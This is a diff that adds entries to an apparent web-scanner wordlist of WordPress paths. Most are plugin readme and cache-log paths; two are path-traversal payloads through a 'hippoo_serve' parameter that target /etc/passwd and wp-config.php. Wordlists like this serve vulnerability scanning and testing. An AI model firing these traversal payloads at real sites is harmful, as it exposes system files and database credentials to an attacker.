@@ -1071,3 +1071,10 @@
 /wp-content/plugins/bookit/readme.txt
 /wp-content/plugins/woocommerce-delivery-notes/readme.txt
 /wp-sitemap-posts-joomsport_season-1.xml
+/wp-content/plugins/hippoo/readme.txt
+/wp-content/plugins/everest-forms-pro/readme.txt
+/wp-content/plugins/armember-membership/readme.txt
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
+/wp-content/cache/log/000000/pagecache.log
+/wp-content/cache/log/000000/minify.log
